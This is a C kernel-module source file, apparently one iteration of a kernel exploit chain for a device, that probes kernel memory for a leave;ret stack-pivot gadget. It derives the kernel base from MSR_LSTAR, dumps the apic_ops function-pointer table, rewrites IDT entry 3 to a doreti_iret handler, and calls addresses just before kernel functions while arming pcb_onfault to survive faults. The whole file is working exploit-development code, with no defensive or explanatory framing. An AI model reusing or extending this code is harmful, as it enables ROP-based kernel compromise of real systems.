#include <stdint.h>

/*
 * resume_chain v10a2 — fn-2/fn-3 probe for leave;ret gadget discovery
 *
 * INT3 (CC) during LAPIC resume is BROKEN (v3, v9a both failed).
 * Alternative: find a leave;ret (C9 C3) gadget for stack pivot.
 *
 * For entries where fn-1 = C3 (ret), fn-2 might be C9 (leave).
 * If so, calling fn-2 executes leave;ret → RSP=RBP → stack pivot.
 *
 * fw_ver encoding:
 *   0xCC00 + entry_index → probe fn-3 of that apic_ops entry
 *   0xDD00 + entry_index → probe fn-2 of that apic_ops entry
 *   0xEE00 + entry_index → probe fn-1 (v8f mode, for reference)
 *
 * Output layout (64 uint64_t slots):
 *   out[0]     = MAGIC (lo32) + status (hi32)
 *   out[1]     = kdata_base
 *   out[2]     = ktext_base
 *   out[3]     = td_pcb
 *   out[4..31] = apic_ops fn ptrs
 *   out[32]    = step progress
 *   out[33]    = target entry index
 *   out[34]    = target fn ptr
 *   out[35]    = probe address (fn-2 or fn-1)
 *   out[36]    = call result (RAX after call)
 *   out[37]    = verdict: 0=unknown, 1=changed(executed), 2=sentinel(ret), 3=faulted
 *   out[38]    = probe type (1=fn-1, 2=fn-2)
 *   out[63]    = end marker
 *
 * Key entries to probe fn-2 (where fn-1 = C3):
 *   [2]  xapic_mode    ktext+0x294340  fn-1=C3  fn-2=?
 *   [14] set_lvt_mode  ktext+0x28E700  fn-1=C3  fn-2=?
 *
 * Possible fn-2 outcomes:
 *   C9 (leave) → leave;ret → stack pivot, crash (RBP unknown)
 *   48 (REX.W) → REX.W ret → clean return (sentinel unchanged)
 *   5D (pop rbp) → pop rbp; ret → pops return addr into RBP, wild ret
 *   CC (INT3) → doreti_iret catches → fn-1=C3=ret → clean return
 *   90 (NOP) → falls through to C3=ret → clean return
 *   other → #UD/#GP → crash
 *
 * Magic written EARLY so kldload can read partial output on crash.
 */

#define MAGIC_RSCN       0x5253434E
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218
#define OFF_APIC_OPS     0x1934AC8
#define OFF_IDT          0x64cdc80
#define OFF_DORETI_IRET  (-0x9cf84c)
#define IDT_ENTRY_SIZE   16
#define APIC_OPS_COUNT   28

#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

#define SENTINEL         0xBAD0BAD0BAD0BAD0ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, (uint16_t)((handler >> 16) & 0xFFFF));
    write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
}

/*
 * Call target address with sentinel in RAX.
 * Returns RAX value after the call.
 * pcb_onfault armed for #PF recovery.
 *
 * NOTE: If target is leave;ret (C9 C3), this function will NOT return
 * normally — RSP gets pivoted. The caller should write magic EARLY.
 */
static uint64_t probe_call(uint64_t target, uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"

        "movabsq $0xBAD0BAD0BAD0BAD0, %%rax\n\t"
        "callq *%[target]\n\t"

        "movq %%rax, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        "2:\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"

        "1:\n\t"
        : [result] "=&r"(result)
        : [target] "r"(target), [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    uint16_t mode_prefix = (fw_ver >> 8) & 0xFF;
    int target_idx = (int)(fw_ver & 0xFF);
    int probe_offset;  /* how many bytes before fn to probe */

    if (mode_prefix == 0xDD) {
        probe_offset = 2;  /* fn-2 probe */
    } else if (mode_prefix == 0xEE) {
        probe_offset = 1;  /* fn-1 probe (v8f compatible) */
    } else if (mode_prefix == 0xCC) {
        probe_offset = 3;  /* fn-3 probe (looking for C9 before 48 C3) */
    } else {
        /* Unknown mode — clear and report */
        for (int i = 0; i < 64; i++) out[i] = 0;
        out[1] = kdata_base;
        out[3] = fw_ver;
        out32[1] = 0x00FD;
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;
        return 0;
    }

    /* Clear output buffer */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    out[1] = kdata_base;
    out[2] = ktext_base;

    /* Write magic EARLY for crash-safe readback */
    out[38] = probe_offset;
    out32[1] = 0x010A;  /* v10a in-progress */
    __asm__ volatile("mfence" ::: "memory");
    out32[0] = MAGIC_RSCN;

    out[32] = 0x01;  /* step: starting */

    /* Validate target index */
    if (target_idx >= APIC_OPS_COUNT) {
        out[33] = target_idx;
        out32[1] = 0x00FE;
        return 0;
    }

    /* Get curthread → td_pcb → onfault_addr */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    out[3] = td_pcb;

    if (!td_pcb) {
        out32[1] = 0x00FF;
        return 0;
    }

    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

    /* Read all 28 fn ptrs from kdata (proven safe) */
    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    for (int i = 0; i < APIC_OPS_COUNT; i++)
        out[4 + i] = read8(apic_ops_addr + i * 8);

    out[32] = 0x02;  /* step: fn ptrs read */

    /* Get target fn ptr */
    uint64_t fn = out[4 + target_idx];
    out[33] = target_idx;
    out[34] = fn;

    if (fn == 0) {
        out[35] = 0;
        out[37] = 0;
        out32[1] = 0x01F0;
        return 0;
    }

    uint64_t probe_addr = fn - probe_offset;
    out[35] = probe_addr;

    /* Save original IDT[3] (16 bytes) */
    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
    uint64_t idt3_orig_lo = read8(idt3_addr);
    uint64_t idt3_orig_hi = read8(idt3_addr + 8);

    /* Set IDT[3] = doreti_iret, IST=0 (catches INT3 if fn-2 = CC) */
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    idt_set_handler(idt3_addr, doreti_iret, 0);

    out[32] = 0x03;  /* step: IDT[3] armed */

    /* === SINGLE PROBE === */
    out[32] = 0x100 + target_idx;  /* step: probing */

    uint64_t result = probe_call(probe_addr, onfault_addr);
    out[36] = result;

    /* If we get here, the call returned (didn't crash/pivot) */

    /* Classify result */
    if (result == SENTINEL) {
        out[37] = 2;  /* sentinel unchanged: ret/NOP+ret/REX+ret */
    } else if (result == 0xFAFAFAFAFAFAFAFAULL) {
        out[37] = 3;  /* faulted (#PF caught by pcb_onfault) */
    } else {
        out[37] = 1;  /* RAX changed: function executed (CC→fn or other) */
    }

    /* Restore original IDT[3] */
    write8(idt3_addr, idt3_orig_lo);
    write8(idt3_addr + 8, idt3_orig_hi);

    out[32] = 0x04;  /* step: complete */

    out[63] = 0xdeadbeefcafe010AULL;

    /* Update magic with completion status */
    out32[1] = 0x110A;  /* v10a complete */

    return 0;
}
